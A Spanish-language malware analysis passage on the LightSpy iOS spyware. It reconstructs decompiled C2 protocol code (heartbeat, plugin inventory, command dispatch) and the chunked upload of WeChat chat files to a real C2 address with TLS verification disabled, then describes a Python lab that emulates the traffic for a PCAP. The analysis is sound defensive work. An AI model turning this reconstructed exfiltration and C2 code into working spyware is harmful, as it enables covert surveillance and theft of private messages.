    [self LoadALLPlugin];
    [self SendPluginListStatus];
    [[Common instance] sendLog:10000 c:@"加载插件列表完毕..."];
}
```

La primera llamada solicita el cuarto `POST /api/log/` del arranque. Puede coexistir con las tres peticiones iniciales; solo queda bloqueada si ya existen cinco transferencias multipart activas. Después de que la llamada obtenga una plaza y entregue la operación a la cola, `SendPluginListInfo` encola en el WSS un mensaje `10007` con la versión global y el inventario conocido:

```json
{
  "cmd": 10007,
  "pluginver": "<version>",
  "data": [
    {
      "name": "<modulo>",
      "ver": "<version>",
      "status": "<estado_decimal>"
    }
  ]
}
```

El método `DownPluginTask`, situado en `0x00028ea8`, toma el último componente de la URL almacenada para cada entrada pendiente y comprueba la ruta correspondiente dentro de `/var/containers/Bundle/`:

```objective-c
NSString *filename = [plugin.url lastPathComponent];
NSString *path = [@"/var/containers/Bundle/"
                      stringByAppendingString:filename];

if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {
    [database setPlugin:plugin.name status:1 path:path];
    [self SendPluginStatusInfo:plugin.name ver:plugin.ver status:1];
} else {
    [database setPlugin:plugin.name status:2];
    [self SendPluginStatusInfo:plugin.name ver:plugin.ver status:2];
    [[Common instance] sendLog:10000 c:missingMessage];
}
```

Cada comprobación genera un `10017`: el estado `1` indica que el fichero está presente y el estado `2` que falta. En ambos casos, `status` se serializa como una cadena decimal. La rama de ausencia añade además una petición multipart a `/api/log/` para comunicar el estado local del artefacto. Si esa llamada encuentra ocupadas las cinco plazas de `post_sem`, `CommandThread` espera antes de continuar con el siguiente módulo, mientras que las tramas WSS encoladas previamente pueden seguir saliendo.

```json
{
  "cmd": 10017,
  "pluginver": "<version>",
  "data": [
    {
      "name": "<modulo>",
      "ver": "<version>",
      "status": "1"
    }
  ]
}
```

El método `LoadALLPlugin` abre los ficheros presentes y puede añadir registros HTTPS por cada carga o inicialización. A continuación, cuando `DbPlugin::getLoadPluginList` devuelve un objeto de lista, `SendPluginListStatus` encola otro `10017` que agrupa los módulos cargados y utiliza el número `4` como estado. El quinto registro base, con `content` igual a `加载插件列表完毕...`, cierra la rutina. Las llamadas se producen en este orden: una en `_start`, dos en `MainFrame::start` y dos en `LoadPluginList`; las ramas de comprobación y carga pueden intercalar registros adicionales antes de la quinta. El código conserva esa secuencia de invocación, aunque la cola concurrente permite que el orden de los paquetes y de las respuestas varíe entre transferencias simultáneas.

```json
{
  "cmd": 10017,
  "pluginver": "<version>",
  "data": [
    {
      "name": "<modulo>",
      "ver": "<version>",
      "status": 4
    }
  ]
}
```

Las llamadas de `LoadPluginList` fijan el orden de generación, pero los dos transportes avanzan de manera independiente. Las peticiones HTTPS multipart se ejecutan con un máximo de cinco transferencias simultáneas; los mensajes `10007` y `10017` salen por WSS en orden FIFO cuando el saludo ya se ha completado y libwebsockets concede escritura. Esta relación permite que las tramas WSS se intercalen con cualquier `POST /api/log/` todavía activo.

### Protocolo de aplicación del C2

#### Primera iteración del hilo principal e información del dispositivo

El segundo hilo iniciado por `MainFrame::start` espera tres segundos y llama a `MainRunning` con ese mismo intervalo. La función comprueba el estado del WebSocket, genera primero el latido y, en la ruta satisfactoria, encola una sola vez la tarea `4` para `UploadMobileInfo`:

```objective-c
- (void)MainRunStart {
    sleep(3);
    while (main_thread_run) {
        [MainFrame MainRunning];
        sleep(3);
    }
}

+ (void)MainRunning {
    BOOL usable = [[SocketRocketUtility instance] checkWebSocket];
    mHeartIntervalTime += 3;
    [[SocketRocketUtility instance] DoHeartBeat];

    if (usable) {
        [self ExeTimerPlan:3];
        if (!mUploadMobileInfo) {
            mUploadMobileInfo = YES;
            [CommandThread EnQueue:4];
        }
    }
}
```

El método `DoHeartBeat`, situado en `0x0001bfa0`, construye el mensaje `10001` antes de que `MainRunning` evalúe la rama que encola la información del dispositivo:

```objective-c
NSDictionary *data = @{
    @"apkver":     [MainFrame getVersion],
    @"pluginver":  [GlobalVar getPluginVersion],
    @"controlver": [GlobalVar getTransportVersion],
    @"planver":    [GlobalVar getCommandPlanVersion],
    @"mode":       [MainFrame getMode]
};

NSDictionary *heartbeat = @{
    @"cmd": @10001,
    @"data": data
};

[socket send:JSONString(heartbeat)];
```

La carga de la trama WSS, antes de aplicar el encapsulado WebSocket y TLS, adopta esta forma:

```json
{
  "cmd": 10001,
  "data": {
    "apkver": "<version>",
    "pluginver": "<version>",
    "controlver": "<version>",
    "planver": "<version>",
    "mode": "<mode>"
  }
}
```

El hilo genera este objeto aproximadamente cada tres segundos. La salida efectiva conserva el orden FIFO y depende del evento de escritura de libwebsockets, por lo que el PCAP puede reflejar un intervalo superior y variable entre tramas.

En una conexión establecida, `checkWebSocket` devuelve un valor verdadero y la primera iteración introduce la tarea `4` después de encolar el latido. El despachador de `CommandThread` asocia ese valor con `UploadMobileInfo`, situado en `0x0001127c`:

```objective-c
NSDictionary *mobileInfo = @{
    @"cmd": @11001,
    @"uid": [GlobalVar getDeviceID],
    @"data": [DeviceInformation getDeviceInfoWithJson]
};

[[Common instance] postForm:mobileInfo
                         toUrl:@"/api/phone/"
                  onCompletion:completion
                       runLoop:0];
```

La llamada produce una conexión TCP/TLS nueva y una petición HTTPS con cuerpo `multipart/form-data` cuya estructura lógica es la siguiente:

```http
POST /api/phone/ HTTP/<versión seleccionada por libcurl>
Host: 45.134.1.180:50000
Content-Type: multipart/form-data; boundary=<boundary>
Content-Length: <longitud>

--<boundary>
Content-Disposition: form-data; name="cmd"

11001
--<boundary>
Content-Disposition: form-data; name="uid"

<device_id>
--<boundary>
Content-Disposition: form-data; name="data"

<JSON de información del dispositivo>
--<boundary>--
```

La tarea `4` se procesa después de que `CommandThread` termine la ejecución inicial de `LoadPluginList`, por lo que `/api/phone/` se solicita después del quinto `POST /api/log/` y de las peticiones adicionales generadas durante esa rutina. Esta relación corresponde al orden de invocación: si quedan plazas libres en `post_sem`, la petición puede solaparse con transferencias anteriores que todavía no hayan terminado. Su respuesta sigue el formato de cuatro bytes de prefijo y JSON ya descrito. El latido WSS pertenece a otra cola y sus paquetes también pueden intercalarse con esta transferencia.

#### Respuesta al latido y sincronización inicial

La primera respuesta `10001` activa la sincronización. El método `DealHeartBeat`, situado en `0x0001c254`, solicita los objetos que todavía no se han obtenido y comprueba las versiones anunciadas por el servidor:

```objective-c
- (void)DealHeartBeat:(NSDictionary *)frame {
    NSDictionary *remote = frame[@"data"];

    if (!self.configObtained) {
        [self DoCommand:10002];
        [self sendPermissionInfo];          // cmd 10018
        self.configObtained = YES;
    }

    if (!self.dormantInfoObtained) {
        self.dormantInfoObtained = YES;
        [self DoCommand:10013];
        [self DoCommand:10005];
    }

    if (![remote[@"controlver"] isEqual:self.controlVersion])
        [self DoCommand:10003];

    if (![remote[@"planver"] isEqual:self.planVersion])
        [self DoCommand:10004];
}

- (void)DoCommand:(int)command {
    [socket send:JSONString(@{ @"cmd": @(command) })];
}
```

El mensaje `10018` añade `status` y un objeto `data` con el estado de permisos. Los nombres de varias claves conservan terminología de Android, otra muestra de la reutilización multiplataforma del núcleo:

```json
{
  "cmd": 10018,
  "status": 0,
  "data": {
    "ReadPhoneState": 1,
    "ReadContacts": 1,
    "ReadExternalStorage": 1,
    "WriteExternalStorage": 1,
    "ReadSms": 1,
    "Location": 1,
    "Camera": 1,
    "ReadCallLog": 1,
    "RecordAudio": 1,
    "ModifyAudioSettings": 1,
    "ProcessOutgoingCalls": 0,
    "AccessWifiState": 1,
    "WakeLock": 1,
    "GetTasks": 1,
    "CanDrawOverlays": 1
  }
}
```

La configuración devuelta mediante `10002` se procesa en `DealConfig`, situado en `0x0001c428`, y contiene al menos `heartinterval` y `reconnect`. El núcleo solo reemplaza sus valores si los enteros recibidos son positivos:

```objective-c
- (void)DealConfig:(NSDictionary *)frame {
    NSDictionary *data = frame[@"data"];
    int heartbeat = [data[@"heartinterval"] intValue];
    int reconnect = [data[@"reconnect"] intValue];

    if (heartbeat > 0)
        [GlobalVar setHeartIntervalTime:heartbeat];
    if (reconnect > 0)
        [GlobalVar setReconnectTime:reconnect];
}
```

#### Controles, planes, manifiestos y órdenes

El método `DealFrameCommand`, situado en `0x0001d1a0`, selecciona el tratamiento mediante el campo entero `cmd`. El siguiente fragmento conserva las ramas relevantes recuperadas:

```objective-c
switch ([frame[@"cmd"] intValue]) {
case 10001: [self DealHeartBeat:frame];              break;
case 10002: [self DealConfig:frame];                 break;
case 10003: [self DealTransportControl:frame];       break;
case 10004: [self DealCommandPlan:frame];            break;
case 10005: [self DealPluginUpdateManifest:frame];   break;
case 10006: [self DealAdditionalConfig:frame];       break;
case 10008: [self DealExeCommand:frame];             break;
case 10009: [self DealCommandOver:frame];            break;
case 10010: [self DealStopCommand:frame];            break;
case 10013: [self DealDormantInfo:frame];            break;
case 10014: [self DealDormantCommand:frame];         break;
case 10015: [self DealInternalCommand:frame];        break;
case 10018: [self DealPermissionInfo:frame];         break;
case 10020: [self DealDestroyCommand:frame];         break;
default:                                                 break;
}
```

El método `DealTransportControl`, situado en `0x0001c544`, procesa el mensaje `10003`, que transporta una versión y una lista de reglas con los campos `cmd`, `wifi` y `mobile`. El método `DealCommandPlan`, situado en `0x0001c754`, procesa el mensaje `10004`, que contiene planes con `type`, `start`, `stop`, `interval` y `cmdlist`; cada entrada de `cmdlist` vuelve a identificar una orden mediante `cmd`. El intervalo de los planes se multiplica por sesenta antes de persistirse. Estos objetos determinan cuándo puede ejecutarse cada capacidad.

#### Actualización posterior a partir del manifiesto

La respuesta `10005` solicitada durante la sincronización puede conducir a una segunda ejecución de `LoadPluginList`. El método `DealPluginUpdateManifest`, situado en `0x000109b0`, exige una versión distinta de la local y un array `data`. Cada entrada utilizable debe proporcionar `name`, `md5`, `ver`, `url` y `classpath`; `initparam` se conserva cuando está presente. El método devuelve un valor verdadero cuando almacena al menos una entrada válida.

```objective-c
- (BOOL)DealPluginUpdateManifest:(NSString *)serializedManifest {
    NSDictionary *manifest = JSONDictionary(serializedManifest);
    NSString *version = manifest[@"version"];

    if ([version isEqualToString:[GlobalVar getPluginVersion]])
        return NO;

    [GlobalVar setPluginVersion:version];
    NSArray *entries = manifest[@"data"];
    [PluginManage UnloadAllPlugin];
    [DbPlugin resetAllPluginDelete];

    BOOL stored = NO;
    for (NSDictionary *entry in entries) {
        if (entry[@"name"] && entry[@"md5"] && entry[@"ver"] &&
            entry[@"url"] && entry[@"classpath"]) {
            [DbPlugin updatePluginItem:entry[@"name"]
                                version:entry[@"ver"]
                                    md5:entry[@"md5"]
                                    url:entry[@"url"]
                              classname:entry[@"classpath"]
                                  param:entry[@"initparam"]];
            stored = YES;
        }
    }
    return stored;
}

- (void)UpdatePlugin:(NSString *)serializedManifest {
    if ([self DealPluginUpdateManifest:serializedManifest])
        [PluginManage LoadPluginList];
}
```

Una versión nueva con al menos una entrada completa invoca nuevamente `LoadPluginList` y vuelve a producir el bloque de registros HTTPS, inventario `10007` y estados `10017` ya definido. En esta rama, el campo `url` se utiliza exclusivamente para obtener el último componente y construir una ruta dentro de `/var/containers/Bundle/`; `DownPluginTask` comprueba ese fichero local y comunica el resultado por los canales del C2.

#### Recepción de la orden seleccionada

Después de la sincronización y del eventual tratamiento del manifiesto, una orden inmediata llega mediante `10008`. El método `DealExeCommand`, situado en `0x0001cb30`, recorre `data`, consulta el tipo asociado a cada `cmd`, serializa la orden y la deja pendiente en su base local. Si el identificador no se puede resolver, responde con una finalización en lugar de ejecutarlo.

```objective-c
- (void)DealExeCommand:(NSDictionary *)frame {
    for (NSDictionary *item in frame[@"data"]) {
        int command = [item[@"cmd"] intValue];
        int type = [self commandType:command];

        if (type == COMMAND_UNKNOWN) {
            [common sendCommandOver:command result:@{}];
            continue;
        }

        NSString *serialized = base64(JSONString(item));
        [database savePendingCommand:command
                                type:type
                                data:serialized];
    }
}
```

La trama seleccionada para continuar el flujo identifica `12005` dentro del array `data`; los argumentos concretos se conservan como parte del objeto entregado al módulo:

```json
{
  "cmd": 10008,
  "data": [
    {
      "cmd": 12005
    }
  ]
}
```

### Orden de `ios_wechat` y transferencia HTTPS

#### Frontera de red del módulo

El módulo recibe una orden ya seleccionada por el núcleo. El método `PluginWeChat::StartCommand:Argv:`, situado en `0x0000b82c`, comprueba el entorno local, crea `WeChatProcess` y delega la ejecución; si no puede hacerlo, solicita inmediatamente al núcleo que envíe una finalización. Dentro de `WeChatProcess`, las órdenes `12001` a `12005` se distribuyen a rutinas distintas. Para el ejemplo de red solo interesa `12005`, que termina invocando la subida de un fichero.

```objective-c
- (void)StartCommand:(int)command Argv:(NSDictionary *)arguments {
    NSString *home = findApplicationHome(@"WeChat");
    if (home == nil) {
        [common sendCommandOver:command result:@{}];
        return;
    }

    WeChatProcess *process = [[WeChatProcess alloc] initWithHome:home];
    [process start:command arguments:arguments];
}
```

En la emulación Python se utilizará un fichero inerte ya disponible para su envío. El método `WeChatTest::testUploadFile`, situado en `0x00007300`, permite recuperar los parámetros que acompañan esa transferencia:

```objective-c
NSDictionary *parameters = @{
    @"cmd": @"12005",
    @"uid": [common GetDeviceID],
    @"chatType": @"wechat",
    @"filepath": filePath,
    @"type": @"chat_file"
};

[common uploadFile:filePath
        withParams:parameters
             toUrl:@"/api/phone_file/"];
```

#### Exfiltración del fichero por HTTPS

El método `Common::uploadFile`, situado en `0x000127ec`, recibe la ruta y los parámetros mostrados en el fragmento anterior, ignora la ruta `/api/phone_file/` propuesta por el módulo y fija como destino efectivo `/api/phone_shard_file`:

```objective-c
- (void)uploadFile:(NSString *)file
        withParams:(NSDictionary *)parameters
             toUrl:(NSString *)ignoredUri {
    NSString *effectiveUri = @"/api/phone_shard_file";
    NSString *url = [self getUrlFromUri:effectiveUri];
    [httpManager uploadFile:file params:parameters url:url];
}

- (NSString *)getUrlFromUri:(NSString *)uri {
    return [NSString stringWithFormat:@"https://%@:%@%@",
            [MainFrame getDestIP],
            [MainFrame getDestPort],
            uri];
}
```

Con los argumentos recuperados de `irc_loader`, el resultado efectivo es:

```text
https://45.134.1.180:50000/api/phone_shard_file
```

La URL anterior solo determina el destino. La transferencia se completa en las capas siguientes de la misma operación. La clase `HttpManager`, mediante el método situado en `0x0000f840`, añade `filepath`, `size` y el MD5 del fichero. El método de Curl situado en `0x000233fc` prepara la ejecución asíncrona; el bucle efectivo se encuentra en el bloque situado en `0x0002369c`. Este último recorre el contenido en bloques máximos de `0x64000` bytes, equivalentes a 409600 bytes, y envía cada bloque mediante una petición HTTPS.

```objective-c
NSMutableDictionary *fields = [parameters mutableCopy];
fields[@"filepath"] = filePath;
fields[@"size"] = [NSString stringWithFormat:@"%zu", fileSize(filePath)];
fields[@"hash"] = MD5File(filePath);

long offset = 0;
int nextOffset;
do {
    seekFile(offset);
    NSData *chunk = readChunk(filePath, offset, 0x64000);
    if (chunk.length == 0)
        break;

    NSData *response = uploadMultipart(url, fields, offset, chunk);

    NSDictionary *body = parseJSON([response subdataWithRange:
        NSMakeRange(4, response.length - 4)]);
    nextOffset = [body[@"offset"] intValue];
    offset = nextOffset;
} while (nextOffset != 0);
```

Los cuatro primeros bytes de la respuesta constituyen un prefijo de protocolo que se omite antes de interpretar el JSON. El código disponible no demuestra su significado, por lo que no debe asignársele una estructura inventada. El campo `offset` se obtiene mediante `intValue`, como entero con signo de 32 bits, y gobierna la siguiente lectura: un valor distinto de cero reposiciona el fichero y un cero termina el bucle. La iteración también concluye si `fread` no devuelve datos.

La llamada de bajo nivel situada en `0x00023e30` construye un cuerpo `multipart/form-data` con todos los parámetros, el desplazamiento y el contenido del fragmento. Esta llamada crea y destruye su propio manejador libcurl en cada iteración, por lo que cada fragmento produce una conexión TCP/TLS independiente. Además, desactiva la verificación del certificado y del nombre, y fija un límite de 300000 milisegundos.

```c
curl_easy_setopt(curl, CURLOPT_URL, upload_url);
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 300000L);
curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, receive_response);
curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_buffer);

for (NSString *key in fields)
    curl_formadd(&form, key, stringValue(fields[key]));

curl_formadd(&form, "offset",   decimal(offset));
curl_formadd_buffer(&form, "file", chunk.bytes, chunk.length);
curl_easy_setopt(curl, CURLOPT_HTTPPOST, form);
curl_easy_perform(curl);
curl_easy_cleanup(curl);
```

Una petición representativa tendrá esta forma una vez descifrada:

```http
POST /api/phone_shard_file HTTP/<versión seleccionada por libcurl>
Host: 45.134.1.180:50000
Content-Type: multipart/form-data; boundary=<boundary>
Content-Length: <longitud>

--<boundary>
Content-Disposition: form-data; name="cmd"

12005
--<boundary>
Content-Disposition: form-data; name="uid"

<device_id>
--<boundary>
Content-Disposition: form-data; name="chatType"

wechat
--<boundary>
Content-Disposition: form-data; name="filepath"

<ruta_del_fichero>
--<boundary>
Content-Disposition: form-data; name="type"

chat_file
--<boundary>
Content-Disposition: form-data; name="size"

<tamano_decimal_del_fichero>
--<boundary>
Content-Disposition: form-data; name="hash"

<md5_del_fichero>
--<boundary>
Content-Disposition: form-data; name="offset"

<desplazamiento>
--<boundary>
Content-Disposition: form-data; name="file"; filename="<ruta_del_fichero>"
Content-Type: <tipo_generado_por_libcurl>

<hasta 409600 bytes>
--<boundary>--
```

Las siete partes procedentes del diccionario pueden aparecer en distinto orden. La parte `offset` se añade después de enumerarlas y la parte `file` se incorpora al final; los límites y otras cabeceras los produce libcurl. Tras la operación, el método `Common::sendCommnadOver:ret:`, situado en `0x00012aac`, construye un resultado breve y lo devuelve por el WebSocket:

```objective-c
NSDictionary *completion = @{
    @"cmd": @(command),
    @"data": result
};
[socket send:JSONString(completion)];
```

La finalización WSS solo se genera después de concluir la transferencia del fichero. Para reproducir esa transición, cada respuesta HTTPS debe contener el prefijo de cuatro bytes y un JSON con `offset`; un valor distinto de cero provoca otro fragmento desde esa posición y el valor cero cierra el bucle antes de enviar el resultado `12005`.

### Secuencia comunicativa

El diagrama conserva el orden total de las diecisiete descargas. En el C2, la numeración de los registros expresa su orden de invocación, mientras que el bloque `par` representa la ejecución concurrente de las peticiones HTTPS multipart, con un máximo de cinco simultáneas, junto con el WSS y la comprobación de conectividad. Las tramas WSS conservan el orden FIFO en que hayan quedado encoladas; el inventario y el latido se generan desde hilos distintos y pueden intercalarse. Los cuatro bloques `opt` corresponden a la consulta DNS condicionada por la caché, las dos comparaciones de versión y la aceptación de un manifiesto nuevo. Los bloques `alt` representan la comprobación efectiva de cada fichero de módulo.

```mermaid
sequenceDiagram
    participant IOS as "Dispositivo iOS"
    participant STAGE as "Staging HTTP 45.83.237.13:8088"
    participant DNS as "Resolutor DNS"
    participant C2H as "C2 HTTPS 45.134.1.180:50000"
    participant C2W as "C2 WSS 45.134.1.180:50000"

    IOS->>STAGE: Nueva TCP y GET 01 browser
    STAGE-->>IOS: Respuesta HTTP y cuerpo browser
    IOS->>STAGE: Nueva TCP y GET 02 EnvironmentalRecording
    STAGE-->>IOS: Respuesta HTTP y cuerpo EnvironmentalRecording
    IOS->>STAGE: Nueva TCP y GET 03 FileManage
    STAGE-->>IOS: Respuesta HTTP y cuerpo FileManage
    IOS->>STAGE: Nueva TCP y GET 04 ios_qq
    STAGE-->>IOS: Respuesta HTTP y cuerpo ios_qq
    IOS->>STAGE: Nueva TCP y GET 05 ios_telegram
    STAGE-->>IOS: Respuesta HTTP y cuerpo ios_telegram
    IOS->>STAGE: Nueva TCP y GET 06 ios_wechat
    STAGE-->>IOS: Respuesta HTTP y cuerpo ios_wechat
    IOS->>STAGE: Nueva TCP y GET 07 KeyChain
    STAGE-->>IOS: Respuesta HTTP y cuerpo KeyChain
    IOS->>STAGE: Nueva TCP y GET 08 light
    STAGE-->>IOS: Respuesta HTTP y cuerpo light
    IOS->>STAGE: Nueva TCP y GET 09 Screenaaa
    STAGE-->>IOS: Respuesta HTTP y cuerpo Screenaaa
    IOS->>STAGE: Nueva TCP y GET 10 ShellCommandaaa
    STAGE-->>IOS: Respuesta HTTP y cuerpo ShellCommandaaa
    IOS->>STAGE: Nueva TCP y GET 11 SoftInfoaaa
    STAGE-->>IOS: Respuesta HTTP y cuerpo SoftInfoaaa
    IOS->>STAGE: Nueva TCP y GET 12 WifiList
    STAGE-->>IOS: Respuesta HTTP y cuerpo WifiList
    IOS->>STAGE: Nueva TCP y GET 13 locationaaa.dylib
    STAGE-->>IOS: Respuesta HTTP y cuerpo locationaaa.dylib
    IOS->>STAGE: Nueva TCP y GET 14 baseinfoaaa.dylib
    STAGE-->>IOS: Respuesta HTTP y cuerpo baseinfoaaa.dylib
    IOS->>STAGE: Nueva TCP y GET 15 irc_loader
    STAGE-->>IOS: Respuesta HTTP y cuerpo irc_loader
    IOS->>STAGE: Nueva TCP y GET 16 launchctl
    STAGE-->>IOS: Respuesta HTTP y cuerpo launchctl
    IOS->>STAGE: Nueva TCP y GET 17 ircbin.plist
    STAGE-->>IOS: Respuesta HTTP y cuerpo ircbin.plist

    Note over IOS: Preparacion local mediante trust cache y permisos
    Note over IOS: El programa launchctl carga el servicio definido por ircbin.plist
    Note over IOS: El cargador irc_loader descifra la configuracion y selecciona ip_port 0
    Note over IOS: El cargador irc_loader abre light y llama a start con 45.134.1.180:50000

    Note over IOS: El nucleo light invoca los registros 1 y 2 antes de crear el hilo WSS
    Note over IOS: El metodo setConfig crea el hilo WSS y despues se programa la alcanzabilidad
    Note over IOS: A continuacion se invoca el registro 3 y arrancan los dos hilos

    par Peticiones HTTPS multipart con maximo de cinco simultaneas
        Note over IOS,C2H: Los numeros indican orden de invocacion, no orden de paquetes
        par Registro base 1 invocado desde start
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ numero 1
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        and Registro base 2 invocado al entrar en MainFrame
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ numero 2
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        and Registro base 3 invocado tras programar la alcanzabilidad
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ numero 3
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        and Registro base 4 invocado al entrar en LoadPluginList
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ numero 4
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        and Registros adicionales por estado o carga local
            loop Por cada registro adicional generado
                IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ adicional
                C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
            end
        and Registro base 5 invocado al salir de LoadPluginList
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ numero 5
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        and Informacion del dispositivo tras LoadPluginList y WSS util
            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/phone/ cmd 11001
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
        end
    and Alcanzabilidad auxiliar
        opt Resolucion no disponible en cache
            IOS->>DNS: Consulta de www.baidu.com segun el resolutor
            DNS-->>IOS: Respuesta DNS
        end
    and Hilo WSS persistente
        IOS->>C2W: Conexion TCP 50000 y negociacion TLS
        IOS->>C2W: Upgrade HTTP a WebSocket con irc-test-proto
        C2W-->>IOS: HTTP 101 Switching Protocols
        Note over IOS,C2W: Las tramas salen en FIFO cuando libwebsockets concede escritura
        par Inventario generado por InitPlugin
            Note over IOS,C2W: El cmd 10007 se genera despues de admitir el registro 4
            IOS->>C2W: Trama WSS cmd 10007 con pluginver y data
            loop Modulos pendientes conocidos
                alt Fichero del modulo presente
                    IOS->>C2W: Trama WSS cmd 10017 con status cadena 1
                else Fichero del modulo ausente
                    IOS->>C2W: Trama WSS cmd 10017 con status cadena 2
                    Note over IOS,C2H: Se anade un registro a la cola HTTPS
                end
            end
            IOS->>C2W: Trama WSS cmd 10017 con status numerico 4
        and Sincronizacion inicial por WSS
            Note over IOS: MainRun espera 3 segundos antes de su primera iteracion
            IOS->>C2W: Trama WSS cmd 10001 de latido
            C2W-->>IOS: Trama WSS cmd 10001 con estado remoto
            IOS->>C2W: Trama WSS cmd 10002 solicitud de configuracion
            IOS->>C2W: Trama WSS cmd 10018 estado de permisos
            IOS->>C2W: Trama WSS cmd 10013 solicitud de reposo
            IOS->>C2W: Trama WSS cmd 10005 solicitud de manifiesto
            Note over IOS,C2W: El servidor puede intercalar las respuestas
            opt Version de control distinta
                IOS->>C2W: Trama WSS cmd 10003 solicitud de controles
                C2W-->>IOS: Trama WSS cmd 10003 con controles
            end
            opt Version de planes distinta
                IOS->>C2W: Trama WSS cmd 10004 solicitud de planes
                C2W-->>IOS: Trama WSS cmd 10004 con planes
            end
            C2W-->>IOS: Trama WSS cmd 10002 con configuracion
            C2W-->>IOS: Trama WSS cmd 10013 con informacion de reposo
            C2W-->>IOS: Trama WSS cmd 10005 con manifiesto
            opt Manifiesto valido con version nueva
                Note over IOS: Se ejecuta otra vez el mismo bloque LoadPluginList
                par Peticiones HTTPS multipart de la nueva ejecucion
                    par Registro de inicio invocado en primer lugar
                        IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ de inicio
                        C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
                    and Registros adicionales
                        loop Por cada registro adicional generado
                            IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ adicional
                            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
                        end
                    and Registro de cierre invocado en ultimo lugar
                        IOS->>C2H: Nueva TCP 50000, TLS y POST /api/log/ de cierre
                        C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON
                    end
                and Inventario y estados WSS de la nueva ejecucion
                    IOS->>C2W: Trama WSS cmd 10007 con inventario
                    loop Modulos incluidos en el manifiesto
                        alt Fichero del modulo presente
                            IOS->>C2W: Trama WSS cmd 10017 con status cadena 1
                        else Fichero del modulo ausente
                            IOS->>C2W: Trama WSS cmd 10017 con status cadena 2
                            Note over IOS,C2H: La rama genera una peticion multipart a /api/log/
                        end
                    end
                    IOS->>C2W: Trama WSS cmd 10017 con status numerico 4
                end
                Note over IOS: Las URL del manifiesto solo proporcionan nombres de ficheros locales
            end

        C2W-->>IOS: Trama WSS cmd 10008 con orden 12005
        Note over IOS: El modulo ios_wechat proporciona un fichero inerte ya disponible
        loop Fragmentos hasta recibir offset 0
            IOS->>C2H: Nueva TCP 50000 y TLS
            IOS->>C2H: POST /api/phone_shard_file con hasta 409600 bytes
            C2H-->>IOS: Respuesta con prefijo de 4 bytes y JSON offset
        end
        IOS->>C2W: Trama WSS cmd 12005 con resultado breve
        end
    end
```



### Laboratorio de generación del PCAP

El laboratorio no ejecuta la IPA original, sino un cliente emulado en Python 3.10 o posterior dentro de WSL. La ejecución reproduce las diecisiete descargas HTTP, la consulta DNS de `www.baidu.com` y el C2 sobre HTTPS y WSS, incluida la sincronización inicial, la orden `12005`, la transferencia inerte de `600000` bytes en dos fragmentos y la confirmación final por WebSocket. Los módulos descargados y el fichero transferido son contenidos sintéticos e inertes.

| Entidad | Dirección y servicio | Procedencia |
|---|---|---|
| Víctima emulada | `10.118.5.10` | Dirección privada asignada al cliente dentro de la topología aislada. |
| Resolutor DNS | `8.8.8.8:53` | Dirección publicada para Google Public DNS; el servicio se emula dentro del *namespace* aislado. |
| Respuesta para `www.baidu.com` | `103.235.46.115` | Respuesta A obtenida el 20 de agosto de 2026. Representa el servicio legítimo consultado y no infraestructura atribuida a LightSpy. |
| Servidor de *staging* | `45.83.237.13:8088` | Extremo HTTP integrado directamente en el componente `095`. |
| C2 HTTPS/WSS | `45.134.1.180:50000` | Extremo recuperado de la configuración cifrada de `irc_loader` y entregado al núcleo `light`. |

El resolutor controlado escucha en `8.8.8.8:53` y responde únicamente por `www.baidu.com` con `103.235.46.115`. La topología asigna `45.83.237.13` y `45.134.1.180` a la entidad que representa la infraestructura de LightSpy, inicia los servidores de *staging* y C2 y captura los flujos desde la entidad víctima.

Este escenario está automatizado en `python-labnet` con el identificador `lightspy`. La ejecución, la captura y la recopilación de los secretos TLS se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).

El PCAP y `lightspy-sslkeys.log` quedan agrupados bajo el subdirectorio `smoke/<fecha-hora>/lightspy/`, por lo que la captura conserva junto a ella el material necesario para descifrar HTTPS y WSS en Wireshark.
